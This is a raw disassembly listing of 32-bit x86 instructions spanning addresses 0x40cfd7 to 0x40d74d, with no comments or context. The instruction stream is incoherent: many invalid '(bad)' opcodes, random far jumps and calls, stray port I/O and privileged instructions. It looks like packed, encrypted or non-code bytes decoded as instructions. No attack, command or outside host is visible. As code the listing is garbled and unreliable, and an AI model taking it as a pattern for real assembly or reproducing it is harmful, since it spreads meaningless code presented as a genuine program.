  40cfd7:	inc    esp
  40cfd8:	data16 icebp 
  40cfda:	or     esi,DWORD PTR [ebx-0x2e]
  40cfdd:	adc    al,0xb5
  40cfdf:	test   al,0x1
  40cfe1:	mov    ch,0x3d
  40cfe3:	daa    
  40cfe4:	inc    ebp
  40cfe5:	fldcw  WORD PTR [ebx+eax*4-0x32]
  40cfe9:	and    cl,ch
  40cfeb:	jl     0x40cf87
  40cfed:	or     eax,0x4ae48b26
  40cff2:	or     eax,0x30fcf0d1
  40cff7:	daa    
  40cff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff9:	sbb    BYTE PTR ds:0x799a3b5d,bl
  40cfff:	sahf   
  40d000:	test   eax,0x475273a7
  40d005:	cmp    ah,ah
  40d007:	xor    esp,DWORD PTR [esi]
  40d009:	arpl   WORD PTR [ecx+0x4f412622],dx
  40d00f:	je     0x40cf9e
  40d011:	(bad)  
  40d013:	test   BYTE PTR [ebx+0x7d863013],ch
  40d019:	cmp    DWORD PTR [esi],ebp
  40d01b:	mov    BYTE PTR [eax-0x23fd8ccf],ah
  40d021:	ds pop ss
  40d023:	out    dx,al
  40d024:	mov    eax,0x878f2620
  40d029:	call   0xb387:0x1b9eba94
  40d030:	xchg   edi,eax
  40d031:	jno    0x40cfff
  40d033:	shl    DWORD PTR [edx+0x1f],cl
  40d036:	outs   dx,BYTE PTR ds:[esi]
  40d037:	cdq    
  40d038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d039:	and    esp,eax
  40d03b:	mov    edx,0x81a93411
  40d040:	mov    cl,0x44
  40d042:	in     al,0x5f
  40d044:	sti    
  40d045:	inc    edi
  40d046:	(bad)  
  40d047:	jnp    0x40d008
  40d049:	mov    gs,ebx
  40d04b:	adc    esi,DWORD PTR [eax-0x44c94802]
  40d051:	inc    esi
  40d052:	mov    ds:0xddbcd3dc,al
  40d057:	push   eax
  40d058:	mov    al,BYTE PTR [ebx+ebx*8+0x54162abb]
  40d05f:	inc    ebx
  40d060:	mov    dh,0x63
  40d062:	xchg   ecx,eax
  40d063:	inc    ebx
  40d064:	adc    esi,esi
  40d066:	jae    0x40d001
  40d068:	ss inc eax
  40d06a:	fldenv [edi]
  40d06c:	mov    bh,0x9
  40d06e:	mov    ds:0x34764e5b,al
  40d073:	dec    edx
  40d075:	mov    ds:0x10328032,al
  40d07a:	inc    ecx
  40d07b:	cs mov ah,0x6
  40d07e:	test   DWORD PTR [ebp+0x11],edi
  40d081:	sti    
  40d082:	call   0x94f:0xd91b7b73
  40d089:	ror    ah,1
  40d08b:	jae    0x40d016
  40d08d:	lods   al,BYTE PTR ds:[esi]
  40d08e:	test   al,0x74
  40d090:	gs fwait
  40d092:	(bad)  
  40d093:	sbb    DWORD PTR [edi+0x22],edi
  40d096:	(bad)  
  40d097:	scas   al,BYTE PTR es:[di]
  40d099:	not    DWORD PTR [ebp-0x4ff513d8]
  40d09f:	inc    esp
  40d0a0:	leave  
  40d0a1:	mov    bh,BYTE PTR ds:0xeeb5a5a3
  40d0a7:	cmp    eax,esi
  40d0a9:	jno    0x40d11b
  40d0ab:	js     0x40d10c
  40d0ad:	dec    ecx
  40d0ae:	inc    ebx
  40d0af:	out    dx,eax
  40d0b0:	retf   0xd445
  40d0b3:	and    BYTE PTR [eax-0x7c],bl
  40d0b6:	sub    al,0x53
  40d0b8:	sub    eax,0xfe126862
  40d0bd:	icebp  
  40d0be:	test   al,0xd
  40d0c0:	aas    
  40d0c1:	and    ch,bl
  40d0c3:	dec    ecx
  40d0c4:	cmp    ebp,DWORD PTR [ecx]
  40d0c6:	out    dx,eax
  40d0c7:	add    bh,BYTE PTR [edx+0x2c]
  40d0ca:	mov    gs,WORD PTR [ebp+0x5e]
  40d0cd:	std    
  40d0ce:	xchg   edx,eax
  40d0cf:	pop    ss
  40d0d0:	xor    esp,DWORD PTR [edx+eiz*8]
  40d0d3:	add    DWORD PTR ss:[eax+0xe382416],ebp
  40d0da:	dec    ebx
  40d0db:	fst    DWORD PTR [edx+0x4c]
  40d0de:	jmp    0xaf8acaf0
  40d0e3:	mov    ebx,0x9a746270
  40d0e8:	sbb    DWORD PTR [edx],edi
  40d0ea:	xor    ecx,eax
  40d0ec:	dec    ebx
  40d0ed:	ret    
  40d0ee:	mov    cl,0xcd
  40d0f0:	fsub   QWORD PTR [eax+esi*1+0x494e84a7]
  40d0f7:	rcl    ah,cl
  40d0f9:	xchg   edi,eax
  40d0fa:	push   esi
  40d0fb:	imul   edi,DWORD PTR ds:0x9f4f310e,0x78
  40d102:	(bad)  
  40d103:	scas   al,BYTE PTR es:[edi]
  40d104:	inc    ecx
  40d105:	cld    
  40d106:	sbb    ch,BYTE PTR [edi+0x35c42bf7]
  40d10c:	push   ebx
  40d10d:	jne    0x40d0ea
  40d10f:	dec    ebx
  40d110:	xchg   DWORD PTR [ebx],edx
  40d112:	push   ecx
  40d113:	out    0xef,eax
  40d115:	pop    ds
  40d116:	(bad)  
  40d117:	fcomp  DWORD PTR [ecx+0x30ff2b30]
  40d11d:	pop    es
  40d11e:	pop    ecx
  40d11f:	push   ebp
  40d120:	in     eax,dx
  40d121:	dec    edx
  40d122:	cmp    BYTE PTR [esi-0x2b5357d4],cl
  40d128:	mov    edx,0x951dda16
  40d12d:	cs mov edi,0xd446186
  40d133:	jp     0x40d141
  40d135:	dec    ebp
  40d136:	and    eax,0x53338a1
  40d13b:	jns    0x40d131
  40d13d:	jmp    0x4615:0x5177fc28
  40d144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d145:	call   0x7025fcb
  40d14a:	mov    ecx,0x7b1046a7
  40d14f:	leave  
  40d150:	sbb    DWORD PTR [edx-0x14e924ad],esp
  40d156:	cld    
  40d157:	cli    
  40d158:	jmp    0xa75e:0x16d968a4
  40d15f:	push   edx
  40d160:	stos   DWORD PTR es:[edi],eax
  40d161:	sbb    al,0x62
  40d163:	sub    dl,dl
  40d165:	jae    0x40d104
  40d167:	jg     0x40d1a3
  40d169:	sar    DWORD PTR [edx+0x5f],0xea
  40d16d:	popa   
  40d16e:	jb     0x40d136
  40d170:	retf   0xdf7c
  40d173:	xchg   DWORD PTR [esp+eiz*8+0x4aba658e],ecx
  40d17a:	sub    al,0xec
  40d17c:	jb     0x40d15e
  40d17e:	dec    BYTE PTR [eax-0x14]
  40d181:	sbb    eax,0xbb94d764
  40d186:	retf   
  40d187:	fs (bad) 
  40d189:	mov    esi,0xf18c4e2d
  40d18e:	gs or  eax,0x219506fe
  40d194:	sub    DWORD PTR [ebp+ebx*8+0x2301edd1],0x23c3856b
  40d19f:	xor    ah,bl
  40d1a1:	(bad)  
  40d1a2:	jmp    0x40d16c
  40d1a4:	test   BYTE PTR [edi],cl
  40d1a6:	adc    edi,esp
  40d1a8:	(bad)  
  40d1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1aa:	add    ebp,DWORD PTR ds:0x93cdb021
  40d1b0:	inc    ecx
  40d1b1:	je     0x40d1c3
  40d1b3:	pop    ebp
  40d1b4:	or     ah,BYTE PTR [edx+ecx*1]
  40d1b7:	into   
  40d1b8:	pop    ecx
  40d1b9:	jecxz  0x40d189
  40d1bb:	fwait
  40d1bc:	(bad)  
  40d1bd:	sub    al,0xe9
  40d1bf:	mov    ds:0x141d728d,eax
  40d1c4:	fcomp  QWORD PTR [ebx-0x18]
  40d1c7:	rol    DWORD PTR [edx+0x130ad9c0],cl
  40d1cd:	cmp    DWORD PTR [bx-0x7f28],0xa74b043b
  40d1d6:	xchg   ebp,eax
  40d1d7:	outs   dx,DWORD PTR ds:[esi]
  40d1d8:	sub    edi,DWORD PTR [esi-0x21d97b08]
  40d1de:	bound  sp,DWORD PTR [ecx+0x1b1d0fc8]
  40d1e5:	loopne 0x40d223
  40d1e7:	jnp    0x40d207
  40d1e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ea:	mov    ecx,DWORD PTR [esi-0x7f0dfd1c]
  40d1f0:	mov    dh,0xac
  40d1f2:	add    DWORD PTR [esi-0x5e],edx
  40d1f5:	sbb    DWORD PTR [ebx],edi
  40d1f7:	mov    esi,DWORD PTR [eax+0x6a]
  40d1fa:	inc    edx
  40d1fb:	xlat   BYTE PTR ds:[ebx]
  40d1fc:	or     BYTE PTR [edi+edi*1],0xc
  40d200:	out    dx,eax
  40d201:	test   cl,al
  40d203:	call   0x762f7de3
  40d208:	fnstenv [edx-0x294d1114]
  40d20e:	lods   al,BYTE PTR ds:[esi]
  40d20f:	jp     0x40d1a3
  40d211:	call   0xda96:0x61fba466
  40d218:	sub    dh,BYTE PTR [ecx-0x4d750b2e]
  40d21e:	pop    eax
  40d21f:	ss ins BYTE PTR es:[edi],dx
  40d221:	push   0x51045c9f
  40d226:	or     BYTE PTR ds:0xeddf4c0,dl
  40d22c:	inc    edi
  40d22d:	cmp    ecx,ebx
  40d22f:	loope  0x40d27a
  40d231:	dec    ecx
  40d232:	sub    eax,0x7d006a32
  40d237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d238:	(bad)  
  40d239:	fisub  DWORD PTR [eax-0x1676cf45]
  40d23f:	lea    esi,[ecx+0x6b]
  40d242:	(bad)  
  40d243:	aad    0x67
  40d245:	das    
  40d246:	xchg   ebp,eax
  40d247:	test   BYTE PTR [edi+0x6ba12f4c],dl
  40d24d:	sub    al,0x70
  40d24f:	pop    ebp
  40d250:	retf   0x59a7
  40d253:	popf   
  40d254:	sbb    esp,DWORD PTR [ecx]
  40d256:	sar    BYTE PTR [ebx-0xda209d6],0x6c
  40d25d:	adc    BYTE PTR [esi-0x2eb98cc2],bh
  40d263:	push   ds
  40d264:	push   esp
  40d265:	js     0x40d26c
  40d267:	sbb    eax,0xe32247e3
  40d26c:	pop    ss
  40d26d:	jnp    0x40d29a
  40d26f:	sbb    al,0xf2
  40d271:	xlat   BYTE PTR ds:[ebx]
  40d272:	xchg   ecx,eax
  40d273:	int    0xa7
  40d275:	fdivr  DWORD PTR [ebp+0x24]
  40d278:	aaa    
  40d279:	in     eax,dx
  40d27a:	(bad)  
  40d27b:	stc    
  40d27c:	pop    esi
  40d27d:	dec    esp
  40d27e:	mov    eax,ds:0x7a57477e
  40d283:	and    DWORD PTR ds:0x37067fd4,ecx
  40d289:	out    0x4e,eax
  40d28b:	addr16 pop ecx
  40d28d:	xchg   DWORD PTR [ecx+0x46479e7a],ebp
  40d293:	enter  0xe267,0xe0
  40d297:	outs   dx,DWORD PTR ds:[esi]
  40d298:	sbb    DWORD PTR [esi-0x4a129914],ecx
  40d29e:	out    0x13,eax
  40d2a0:	out    dx,eax
  40d2a1:	or     dh,BYTE PTR [ecx+0x5c]
  40d2a4:	fs pop edx
  40d2a6:	outs   dx,DWORD PTR ds:[esi]
  40d2a7:	inc    ecx
  40d2a8:	scas   al,BYTE PTR es:[edi]
  40d2a9:	inc    edx
  40d2aa:	mov    al,ds:0x6b59dff6
  40d2af:	ds pop ds
  40d2b1:	stos   BYTE PTR es:[edi],al
  40d2b2:	mov    ah,0x3d
  40d2b4:	fldcw  WORD PTR [esi-0x4383ce85]
  40d2ba:	out    0x8c,eax
  40d2bc:	out    0x68,eax
  40d2be:	or     al,0x55
  40d2c0:	add    ebx,esp
  40d2c2:	sub    bl,dh
  40d2c4:	(bad)  
  40d2c5:	stc    
  40d2c6:	int3   
  40d2c7:	mov    eax,0x49dd4070
  40d2cc:	mov    ?,eax
  40d2ce:	std    
  40d2cf:	outs   dx,BYTE PTR ds:[esi]
  40d2d0:	sahf   
  40d2d1:	mov    ss,WORD PTR [esi-0x72118755]
  40d2d7:	retf   
  40d2d8:	not    BYTE PTR [eax-0x4c3c1b7d]
  40d2de:	in     eax,dx
  40d2df:	sbb    bh,BYTE PTR [ecx]
  40d2e1:	test   ah,dh
  40d2e3:	mov    ds:0xf4d910f1,eax
  40d2e8:	pop    ds
  40d2e9:	(bad)  
  40d2ea:	push   0xa1848e32
  40d2ef:	xchg   ebp,eax
  40d2f0:	fild   QWORD PTR [ebx]
  40d2f2:	popa   
  40d2f3:	sti    
  40d2f4:	aam    0x5f
  40d2f6:	push   ebx
  40d2f7:	out    dx,eax
  40d2f8:	push   esp
  40d2f9:	jo     0x40d32a
  40d2fb:	push   ebx
  40d2fc:	lea    edi,[eax-0x2f]
  40d2ff:	icebp  
  40d300:	hlt    
  40d301:	hlt    
  40d302:	(bad)  
  40d304:	add    ecx,DWORD PTR [ebx-0x3b]
  40d307:	(bad)  
  40d308:	xchg   edx,eax
  40d309:	push   ecx
  40d30a:	sbb    ecx,DWORD PTR [edi+0x18]
  40d30d:	jge    0x40d367
  40d30f:	dec    eax
  40d310:	push   eax
  40d311:	adc    bl,dl
  40d313:	sbb    al,0x4
  40d316:	sbb    BYTE PTR [edi+0x519d56bd],bl
  40d31c:	popa   
  40d31d:	lds    esi,FWORD PTR [edx+0x46a66307]
  40d323:	xchg   ebp,eax
  40d324:	retf   0x5394
  40d327:	xor    DWORD PTR [eax+0x5daafcb9],ecx
  40d32d:	push   esp
  40d32e:	in     eax,dx
  40d32f:	mov    dh,BYTE PTR [esi-0x22]
  40d332:	sub    dl,BYTE PTR [eax+0x6c8fd07]
  40d338:	pop    ecx
  40d339:	das    
  40d33a:	jecxz  0x40d397
  40d33c:	inc    ebx
  40d33d:	adc    dh,BYTE PTR [esi]
  40d33f:	out    dx,eax
  40d340:	aaa    
  40d341:	push   ecx
  40d342:	in     al,0xd
  40d344:	xchg   esi,eax
  40d345:	or     al,0x5e
  40d347:	pop    ss
  40d348:	(bad)  
  40d34a:	push   cs
  40d34b:	fiadd  DWORD PTR [ebp-0x39]
  40d34e:	dec    ebp
  40d34f:	mov    ebx,DWORD PTR [eax+ebp*2+0x29]
  40d353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d354:	fld    DWORD PTR [edi-0x39514407]
  40d35a:	sbb    al,0x24
  40d35c:	inc    ebp
  40d35d:	jg     0x40d384
  40d35f:	jmp    0xa9d0:0x84abfb46
  40d366:	ficomp DWORD PTR [ebp+0x48]
  40d369:	mov    ah,0x98
  40d36b:	jmp    FWORD PTR [edx]
  40d36d:	sub    eax,0x4cfe3fb7
  40d372:	ins    DWORD PTR es:[edi],dx
  40d373:	sahf   
  40d374:	in     eax,0x5e
  40d376:	(bad)  
  40d377:	test   DWORD PTR [eax],0x715a7d84
  40d37d:	dec    edi
  40d37e:	sub    ebp,eax
  40d380:	cs pop eax
  40d382:	arpl   WORD PTR [edi-0x6],di
  40d385:	mov    ebx,0x6c7e08a2
  40d38a:	cmp    DWORD PTR [edi+0x65d1d57c],0x93e1c6f1
  40d394:	arpl   WORD PTR [ebx],di
  40d396:	loope  0x40d31e
  40d398:	inc    ecx
  40d399:	or     BYTE PTR [edi-0x40d3918b],ch
  40d39f:	aaa    
  40d3a0:	jmp    0xb0c:0xbae68d60
  40d3a7:	mov    edi,0x18673e8c
  40d3ac:	mov    WORD PTR [edi+0x66],?
  40d3af:	loop   0x40d42e
  40d3b1:	inc    esi
  40d3b2:	cmp    al,0xd9
  40d3b4:	into   
  40d3b5:	sbb    eax,0x3bec9efa
  40d3ba:	ja     0x40d42f
  40d3bc:	(bad)  
  40d3bd:	sub    eax,0x51b71390
  40d3c2:	sub    eax,esp
  40d3c4:	or     esp,esp
  40d3c6:	pop    ss
  40d3c7:	imul   ecx,DWORD PTR [esi+0x201d860f],0xf2f75c21
  40d3d1:	push   0xfffffff8
  40d3d3:	dec    ebx
  40d3d4:	and    DWORD PTR [edx-0xafdd4e4],ebx
  40d3da:	call   0x615:0x87f71087
  40d3e1:	pop    edi
  40d3e2:	in     eax,0x74
  40d3e4:	mov    ah,0xf5
  40d3e6:	out    dx,al
  40d3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3e8:	cwde   
  40d3e9:	mov    ecx,0xe13cfe06
  40d3ee:	cs mov ebp,0xa7f41617
  40d3f4:	push   edx
  40d3f5:	rol    DWORD PTR [ebx],1
  40d3f7:	xchg   ebx,eax
  40d3f8:	data16 sar al,cl
  40d3fb:	adc    DWORD PTR [edi-0x6e],esi
  40d3fe:	mov    esi,0x18e86867
  40d403:	into   
  40d404:	add    DWORD PTR [ebx+0x545f0fd0],ecx
  40d40a:	sub    ah,BYTE PTR [edx+0x69]
  40d40d:	cli    
  40d40e:	cs popa 
  40d410:	int3   
  40d411:	imul   esp,DWORD PTR [eax+ebp*4+0x29],0x8fd685a7
  40d419:	div    ecx
  40d41b:	mov    ds:0x2f4cf3f,al
  40d420:	and    DWORD PTR [ebp-0x5b],esi
  40d423:	sub    esi,DWORD PTR [eax+0x49bf82a3]
  40d429:	loope  0x40d3ef
  40d42b:	aam    0xd3
  40d42d:	xchg   edi,eax
  40d42e:	lods   al,BYTE PTR ds:[esi]
  40d42f:	emms   
  40d431:	sbb    edi,DWORD PTR [eax+0x3f4d7c29]
  40d437:	and    BYTE PTR [ebp+0x1d8551c2],dh
  40d43d:	jmp    0xf3e0771a
  40d442:	lea    esi,[edi+0x5518af50]
  40d448:	pusha  
  40d449:	jmp    0x2e668d13
  40d44e:	rol    BYTE PTR [edi],1
  40d450:	ror    BYTE PTR [eax],cl
  40d452:	xor    edx,edx
  40d454:	pop    edx
  40d455:	inc    eax
  40d456:	outs   dx,DWORD PTR ds:[esi]
  40d457:	push   eax
  40d458:	aas    
  40d459:	xlat   BYTE PTR ds:[ebx]
  40d45a:	ins    DWORD PTR es:[edi],dx
  40d45b:	dec    eax
  40d45c:	fsub   DWORD PTR [ebp+0x676dcd9]
  40d462:	stos   DWORD PTR es:[edi],eax
  40d463:	imul   DWORD PTR ds:0x16f5b4a8
  40d469:	push   edi
  40d46a:	pop    ebx
  40d46b:	sbb    al,0xcd
  40d46d:	in     al,dx
  40d46e:	mov    al,0x19
  40d470:	inc    ebp
  40d471:	mov    ch,0xf7
  40d473:	and    edx,DWORD PTR [ebx-0x17]
  40d476:	push   ds
  40d477:	ret    0x864b
  40d47a:	rcr    DWORD PTR [eax],1
  40d47c:	pushf  
  40d47d:	hlt    
  40d47e:	or     cl,BYTE PTR [ecx+ecx*8+0x70]
  40d482:	sub    al,0x2c
  40d485:	sahf   
  40d486:	bound  ecx,QWORD PTR es:[ecx-0x488d1976]
  40d48d:	inc    ebx
  40d48e:	cli    
  40d48f:	and    eax,0xdd67bfcd
  40d494:	push   ebx
  40d495:	xchg   ebx,eax
  40d496:	cmp    ebp,ebp
  40d498:	enter  0xe635,0x9f
  40d49c:	fadd   DWORD PTR [edi-0x76]
  40d49f:	jo     0x40d465
  40d4a1:	(bad)  
  40d4a2:	test   DWORD PTR [ebx],0x29e5113d
  40d4a8:	loopne 0x40d44d
  40d4aa:	loop   0x40d4d1
  40d4ac:	sbb    dl,BYTE PTR [edx]
  40d4ae:	cld    
  40d4af:	dec    edx
  40d4b0:	addr16 or al,0xb7
  40d4b3:	test   WORD PTR [esi+0x67],si
  40d4b7:	mov    ds:0x21bef489,al
  40d4bc:	enter  0xbd0a,0x4e
  40d4c0:	jns    0x40d4d5
  40d4c2:	hlt    
  40d4c3:	cwde   
  40d4c4:	xchg   edx,eax
  40d4c5:	cmp    DWORD PTR [ebx+eax*1-0x69795e81],ecx
  40d4cc:	cmp    BYTE PTR [ecx],cl
  40d4ce:	add    DWORD PTR [eax-0x1a84fecb],ecx
  40d4d4:	jp     0x40d468
  40d4d6:	cdq    
  40d4d7:	push   esp
  40d4d8:	xor    ch,dl
  40d4da:	push   esi
  40d4db:	call   0x3a0d1d87
  40d4e0:	xor    eax,0x129e70a0
  40d4e5:	jbe    0x40d4ad
  40d4e7:	scas   eax,DWORD PTR es:[edi]
  40d4e8:	jbe    0x40d485
  40d4ea:	xchg   ebp,eax
  40d4eb:	jmp    0x40d552
  40d4ed:	out    0x34,eax
  40d4ef:	jbe    0x40d56a
  40d4f1:	inc    ebx
  40d4f2:	sahf   
  40d4f3:	pop    edx
  40d4f4:	(bad)  
  40d4f5:	and    eax,0xfaa5c61a
  40d4fa:	(bad)
  40d4fd:	jle    0x40d4fb
  40d4ff:	mov    eax,ds:0xca40b6b8
  40d504:	cli    
  40d505:	ficomp DWORD PTR [eax+0x3f]
  40d508:	ficom  WORD PTR [ecx+0x575d6881]
  40d50e:	cs mov ebp,0xdf8e7cf
  40d514:	call   0xe393:0x3647c740
  40d51b:	sub    al,0xe9
  40d51d:	jmp    0x38ec:0x1548cfa2
  40d524:	cwde   
  40d525:	mov    dl,0x3d
  40d527:	not    al
  40d529:	mov    ah,0xcd
  40d52b:	jnp    0x40d577
  40d52d:	outs   dx,BYTE PTR ds:[esi]
  40d52e:	dec    eax
  40d52f:	mov    ah,0xbf
  40d531:	mov    dl,0x5e
  40d533:	inc    esp
  40d534:	test   al,0xfd
  40d536:	rol    BYTE PTR [eax+0x43b9287],cl
  40d53c:	pop    esp
  40d53d:	pop    es
  40d53e:	or     esi,edi
  40d540:	lods   al,BYTE PTR ds:[esi]
  40d541:	xchg   edx,eax
  40d542:	cld    
  40d543:	adc    ch,BYTE PTR [edi-0x55]
  40d546:	sub    al,0x52
  40d548:	daa    
  40d549:	dec    edi
  40d54a:	loop   0x40d54b
  40d54c:	cmp    al,0xb2
  40d54e:	sub    edi,DWORD PTR [esi]
  40d550:	popf   
  40d551:	pop    esi
  40d552:	in     al,dx
  40d553:	ret    0x515
  40d556:	mov    dh,BYTE PTR [edi]
  40d558:	jne    0x40d59a
  40d55a:	(bad)  
  40d55b:	(bad)  
  40d55c:	leave  
  40d55d:	adc    ch,BYTE PTR [edx-0x7a099632]
  40d563:	mov    cl,0x5a
  40d565:	mov    ch,BYTE PTR [edx+ebx*8]
  40d568:	sub    eax,0xcb37e4d2
  40d56d:	jl     0x40d5ce
  40d56f:	in     al,dx
  40d570:	imul   ebp,DWORD PTR [ecx],0x5f8f7896
  40d576:	ins    BYTE PTR es:[edi],dx
  40d577:	mov    bl,0xa7
  40d579:	cmp    ebx,DWORD PTR [ecx]
  40d57b:	ins    DWORD PTR es:[edi],dx
  40d57c:	mov    ch,dl
  40d57e:	mov    dl,0x68
  40d580:	add    BYTE PTR [ebx+0x64],bh
  40d583:	cmc    
  40d584:	or     eax,0x2f838849
  40d589:	mov    al,ds:0xabe629c8
  40d58e:	lods   al,BYTE PTR ds:[esi]
  40d58f:	mov    dh,0xc6
  40d591:	fwait
  40d592:	jno    0x40d560
  40d594:	push   ecx
  40d595:	rcr    DWORD PTR [ebx-0x73],0x37
  40d599:	push   eax
  40d59a:	fs sti 
  40d59c:	fs out 0x5a,eax
  40d59f:	inc    edx
  40d5a0:	js     0x40d577
  40d5a2:	mov    ch,0xd2
  40d5a4:	sahf   
  40d5a5:	pop    ecx
  40d5a6:	sub    DWORD PTR [esp+edx*1+0x60],edi
  40d5aa:	icebp  
  40d5ab:	imul   edi,DWORD PTR [edi],0xe9c174a6
  40d5b1:	jo     0x40d5e6
  40d5b3:	push   0x7f
  40d5b5:	dec    esp
  40d5b6:	pop    ds
  40d5b7:	test   eax,0x4bf89deb
  40d5bc:	loop   0x40d5ed
  40d5be:	push   ebx
  40d5bf:	push   esi
  40d5c0:	push   esi
  40d5c1:	pop    esp
  40d5c2:	test   eax,0x3b3997e
  40d5c7:	xor    eax,eax
  40d5c9:	pop    edx
  40d5ca:	sbb    ebx,DWORD PTR [esi]
  40d5cc:	add    al,0x47
  40d5ce:	mov    dl,0x46
  40d5d0:	pop    es
  40d5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5d2:	repz int 0xf4
  40d5d5:	xchg   ebp,eax
  40d5d6:	inc    ebx
  40d5d7:	xchg   esp,eax
  40d5d8:	mov    ebp,0x6875144
  40d5dd:	jns    0x40d569
  40d5df:	(bad)  
  40d5e0:	enter  0xef8f,0xfb
  40d5e4:	or     al,0x8
  40d5e6:	loopne 0x40d5f3
  40d5e8:	mov    BYTE PTR [edx+0x71],bl
  40d5eb:	mov    ebx,0x9dc2c423
  40d5f0:	out    0x75,eax
  40d5f2:	pop    esp
  40d5f3:	cwde   
  40d5f4:	sbb    edx,eax
  40d5f6:	lahf   
  40d5f7:	sub    DWORD PTR [eax+0x2e],esp
  40d5fa:	xor    al,0x9c
  40d5fc:	retf   
  40d5fd:	dec    esi
  40d5fe:	sub    ah,BYTE PTR [ebx+0x7e4b1015]
  40d604:	outs   dx,BYTE PTR ds:[esi]
  40d605:	ficomp WORD PTR [ecx+0x19881429]
  40d60b:	ret    
  40d60c:	(bad)  
  40d60d:	pop    esi
  40d60e:	shl    BYTE PTR [edx-0x121d0fd2],1
  40d614:	sub    BYTE PTR [ebx-0x5f81baca],bh
  40d61a:	jnp    0x40d699
  40d61c:	mov    al,0xb7
  40d61e:	inc    ebp
  40d61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d620:	cdq    
  40d621:	bound  esp,QWORD PTR [esi+0x66]
  40d624:	int    0x5c
  40d626:	mov    ebx,0x176c91a7
  40d62b:	retf   
  40d62c:	addr16 push ss
  40d62e:	fld    DWORD PTR [ebx+0x6c]
  40d631:	(bad)  
  40d632:	xchg   edx,eax
  40d633:	sbb    DWORD PTR ds:0x530ccbe,0x5e
  40d63a:	popa   
  40d63b:	int3   
  40d63c:	(bad)  
  40d63d:	addr16 cdq 
  40d63f:	push   ecx
  40d640:	mov    cl,0xe9
  40d642:	mov    eax,0xe7aafe7a
  40d647:	sbb    edx,DWORD PTR [esi-0x5f]
  40d64a:	cli    
  40d64b:	mov    ebx,DWORD PTR [edi+0x4778715f]
  40d651:	push   0x52
  40d653:	inc    edi
  40d654:	std    
  40d655:	cmc    
  40d656:	stos   DWORD PTR es:[edi],eax
  40d657:	pop    ds
  40d658:	out    0x3f,al
  40d65a:	xchg   esp,eax
  40d65b:	in     eax,0x92
  40d65d:	jns    0x40d6ba
  40d65f:	lahf   
  40d660:	int    0x5
  40d662:	lds    ebx,FWORD PTR [ebx+ebp*1+0x2be43b0d]
  40d669:	leave  
  40d66a:	loopne 0x40d631
  40d66c:	push   ecx
  40d66d:	jae    0x40d653
  40d66f:	jl     0x40d67a
  40d671:	mov    eax,0x2a2a055
  40d676:	add    edx,esi
  40d678:	rcl    DWORD PTR [edi-0x58e1e304],1
  40d67e:	sbb    ecx,edi
  40d680:	mov    bl,0x5c
  40d682:	push   0xf3f20511
  40d687:	(bad)  
  40d688:	js     0x40d6e6
  40d68a:	shl    BYTE PTR [esi-0x6265bdea],0xb
  40d691:	repz add al,0xc4
  40d694:	inc    ecx
  40d695:	(bad)  
  40d696:	mov    esi,0xb5b13b1a
  40d69b:	pusha  
  40d69c:	mov    ebp,0xc616f995
  40d6a1:	shl    BYTE PTR [esi-0x2b94ac8d],0x3a
  40d6a8:	inc    esi
  40d6a9:	sbb    edi,edx
  40d6ab:	nop
  40d6ac:	pop    ebx
  40d6ad:	inc    esi
  40d6ae:	push   ebx
  40d6af:	shl    bl,1
  40d6b1:	std    
  40d6b2:	mov    dh,0xd3
  40d6b4:	push   es
  40d6b5:	sub    ebx,DWORD PTR [ebx-0x4e7adec5]
  40d6bb:	js     0x40d6ed
  40d6bd:	xchg   BYTE PTR [ecx+edi*2],bh
  40d6c0:	cmp    DWORD PTR [ecx+0x57dc69fe],esi
  40d6c6:	push   ecx
  40d6c7:	mov    ecx,0x72c5e816
  40d6cc:	dec    esi
  40d6cd:	(bad)  
  40d6ce:	xchg   ebp,eax
  40d6cf:	sub    edx,DWORD PTR [edx-0x20]
  40d6d2:	mov    bl,0x6e
  40d6d4:	in     eax,0x5d
  40d6d6:	cmp    esi,DWORD PTR [ecx]
  40d6d8:	aam    0x2f
  40d6da:	add    BYTE PTR [esp+ebp*8],bh
  40d6dd:	pop    ebp
  40d6de:	inc    edx
  40d6df:	mov    esi,0x7fd05944
  40d6e4:	imul   esi,ecx,0xffffff9e
  40d6e7:	dec    esi
  40d6e8:	sub    ah,BYTE PTR [ebx+0x3b]
  40d6eb:	stos   DWORD PTR es:[edi],eax
  40d6ec:	cmp    eax,0x64dacf9f
  40d6f1:	mov    WORD PTR [ebx+0x2a],fs
  40d6f4:	fcmovu st,st(7)
  40d6f6:	cs sahf 
  40d6f8:	js     0x40d73f
  40d6fa:	push   cs
  40d6fb:	aad    0x8
  40d6fd:	mov    dl,0xff
  40d6ff:	add    eax,0x89e9e728
  40d704:	xchg   BYTE PTR [ecx-0x4f],bl
  40d707:	ins    DWORD PTR es:[edi],dx
  40d708:	or     esp,esi
  40d70a:	mov    edx,esi
  40d70c:	jl     0x40d77d
  40d70e:	jle    0x40d708
  40d710:	jns    0x40d6de
  40d712:	mov    bl,0xc0
  40d714:	into   
  40d715:	sub    esp,DWORD PTR [edx-0x5698eaba]
  40d71b:	xlat   BYTE PTR ds:[ebx]
  40d71c:	or     DWORD PTR [ebx],edi
  40d71e:	push   esi
  40d71f:	out    dx,al
  40d720:	ins    DWORD PTR es:[edi],dx
  40d721:	mov    dh,bl
  40d723:	mov    ch,0xdb
  40d725:	pushf  
  40d726:	sahf   
  40d727:	push   ss
  40d728:	xchg   esi,eax
  40d729:	push   cs
  40d72a:	xchg   edi,eax
  40d72b:	in     al,0x19
  40d72d:	fbstp  TBYTE PTR [eax+ebx*1-0x74]
  40d731:	mov    ?,WORD PTR [ebp-0x74]
  40d734:	dec    BYTE PTR [edx+0x70]
  40d737:	sbb    ah,dh
  40d739:	es loopne 0x40d7a1
  40d73c:	add    BYTE PTR [ebp-0x148406c1],ch
  40d742:	icebp  
  40d743:	daa    
  40d744:	inc    eax
  40d745:	mov    ds:0x64e0149f,al
  40d74a:	mov    BYTE PTR [ebx-0x1c],al
  40d74d:	and    dl,BYTE PTR [edx-0x73ca285b]
